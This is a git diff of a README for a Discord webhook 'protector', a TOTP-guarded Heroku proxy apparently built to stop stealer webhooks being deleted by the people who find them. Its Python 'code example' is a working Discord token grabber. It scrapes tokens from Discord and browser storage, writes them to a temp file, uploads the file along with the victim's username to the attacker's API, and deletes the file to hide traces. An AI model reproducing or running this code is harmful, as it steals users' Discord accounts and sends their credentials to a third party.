@@ -1,41 +1,105 @@
-<p align="center">
-<img src="https://img.shields.io/github/languages/top/Rdimo/Discord-Webhook-Protector?style=flat-square" </a>
-<img src="https://img.shields.io/github/last-commit/Rdimo/Discord-Webhook-Protector?style=flat-square" </a>
-<img src="https://img.shields.io/github/stars/Rdimo/Discord-Webhook-Protector?color=444444&label=Stars&style=flat-square" </a>
-<img src="https://img.shields.io/github/forks/Rdimo/Discord-Webhook-Protector?color=444444&label=Forks&style=flat-square" </a>
-</p>
-</p>
-<p align="center">
-<a href="https://github.com/Rdimo/Discord-Webhook-Protector#setting-up-the-api">Setup the api</a> ⋮
-<a href="https://cheataway.com">Discord</a>
+<h1 align="center">
+  Discord Webhook Protector 🔰
+</h1>
+
+<p align="center"> 
+  <kbd>
+<img src="https://raw.githubusercontent.com/Rdimo/images/master/Discord-Webhook-Protector/Discord-Webhook-Protector.png"></img>
+  </kbd>
 </p>
 
-#### Discord-Webhook-Protector was made by
+<p align="center">
+  <img src="https://img.shields.io/github/languages/top/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
+  <img src="https://img.shields.io/github/last-commit/Rdimo/Discord-Webhook-Protector?style=flat-square"/>
+  <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Discord-Webhook-Protector&metric=ncloc"/>
+  <img src="https://img.shields.io/github/stars/Rdimo/Discord-Webhook-Protector?color=444444&label=Stars&style=flat-square"/>
+  <img src="https://img.shields.io/github/forks/Rdimo/Discord-Webhook-Protector?color=444444&label=Forks&style=flat-square"/>
+</p>
+
+<h4 align="center">
+  <a href="https://cheataway.com">🌌・Discord</a>
+  ⋮
+  <a href="https://github.com/Rdimo/Discord-Webhook-Protector#setting-up-the-api">🎉・Setup the api</a>
+  ⋮
+  <a href="https://github.com/Rdimo/Discord-Webhook-Protector#code-example">🎈・Code example</a>
+</h4>
+
+<h2 align="center">
+  Discord-Webhook-Protector was made by
+
 Love ❌ code ✅
+
+</h2>
 
 ---
 
-### 🔰・Features
+## 🔰 〢 Features
+
 ```
-> Easy to setup
-> Webhook protected by totp so webhook can't be spammed or deleted even if they http debug!
-> Accepting only post requests
-> near to impossible to delete webhook (still possible to spam, but very hard)
+> Easy to setup!
+> Configurable!
+> Accepts both embeds and files!
+> Ratelimits unauthorized requests!
+> Accepting only post requests!
+> Impossible to delete webhook
+> Webhook protected by totp so webhook can't be spammed even if they http debug!
 ```
 
-### 🎈・Code example
+---
+
+### 📁 〢 Setting up the api
+
+1. Create an account on [Heroku.com](https://heroku.com)
+2. Install [nodejs](https://nodejs.org/en/), [heroku cli](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up), and [git](https://git-scm.com/)
+3. Open [config.json](https://github.com/Rdimo/Discord-Webhook-Protector/blob/main/config.json) and put in your webhook at the top
+4. Open cmd in the directory and type `npm i`
+5. Now follow these steps carefully ⇣
+
+```sh-session
+$ heroku login
+...
+$ git init
+$ git add .
+$ git commit -m "first Webhook protector api commit"
+...
+$ heroku create
+...
+$ git push heroku main
+...
+$ heroku ps:scale web=1
+$ heroku open
+```
+
+### ⚙ 〢 Settings
+
+The config and what the options do
+
+```json
+{
+  "webhook": "https://discord.com/api/webhooks/0123456789/abcdefghijklmnopqrstuvwxyz", //your discord webhook
+  "pass32": "K4ZVUQTSIRMDOWKRGU2WQQTZJM======" /*a key encoded in base32, see https://github.com/bellstrand/totp-generator#how-to-use for more*/,
+  "rateLimitTimeout": 12000, //amount of milliseconds an ip gets ratelimited
+  "port": 3000 //port
+}
+```
+
+### 🎈 〢 Code example
+
+Example use of the api hosted on heroku
+
 ```py
 import os, re
 import requests
 from pyotp import TOTP
 
-api = "https://your-random-heroku-name.herokuapp.com" #the name of your app will probably be something like https://frozen-beach-72554.herokuapp.com
+api = "https://your-heroku-app-name.herokuapp.com" #the name of your app will probably be something like https://frozen-beach-72554.herokuapp.com
 
 pass32 = 'K4ZVUQTSIRMDOWKRGU2WQQTZJM======' #needs to be same key as the one in your api
 key = TOTP(pass32).now()
 
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
+_file = os.getenv('temp') + os.sep + 'tokens.txt'
 
 paths = {
     'Discord': roaming + '\\Discord\\Local Storage\\leveldb',
@@ -55,29 +119,10 @@ for platform, path in paths.items():
         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
             for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                 for token in re.findall(regex, line):
-                    requests.post(api, headers={"Authorization": key}, json={"content": token})
-```
+                    with open(_file, 'a') as f:
+                        f.write(token)
 
-### 📁・Setting up the api
-1. Create an account on [Heroku.com](https://heroku.com)
-2. Install [nodejs](https://nodejs.org/en/), [heroku cli](https://devcenter.heroku.com/articles/getting-started-with-nodejs#set-up), and [git](https://git-scm.com/)
-3. open api.js and put in your webhook at the top (line 5)
-4. open cmd in the directory and type `npm i`
-5. Now follow these steps carefully ⇣
-```sh-session
-$ heroku login
-...
-$ git init
-$ git add .
-$ git commit -m "first Webhook protector api commit"
-...
-$ heroku create
-...
-$ git push heroku main
-...
-$ heroku ps:scale web=1
-$ heroku open
+requests.post(api, headers={"Authorization": key}, data={"content": f'Successfully grabbed tokens from {os.getlogin()}:'}) #send the text to webhook
+requests.post(api, headers={"Authorization": key}, files={"upload_file": open(_file, 'rb')}) #send text file with tokens in it to the webhook
+os.remove(_file) #delete traces
 ```
-
-### 📜・ Upcoming features
-* File upload support (prob not in a while tho since im too lazy)
